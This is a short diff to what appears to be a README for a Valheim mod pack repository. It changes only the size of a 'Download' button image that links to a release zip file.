@@ -7,7 +7,7 @@
 
 
 <a href="https://github.com/FigureSectorSilo/Valheim-Mods-External/releases/download/Latest/Valheim_ModPack.zip">
-  <img width="1774" height="887" alt="Download" src="https://github.com/user-attachments/assets/fe6b983e-aa66-4a0f-8add-d4e6f00135de" />
+  <img width="160" alt="Download" src="https://github.com/user-attachments/assets/fe6b983e-aa66-4a0f-8add-d4e6f00135de" />
 </a>
 
 
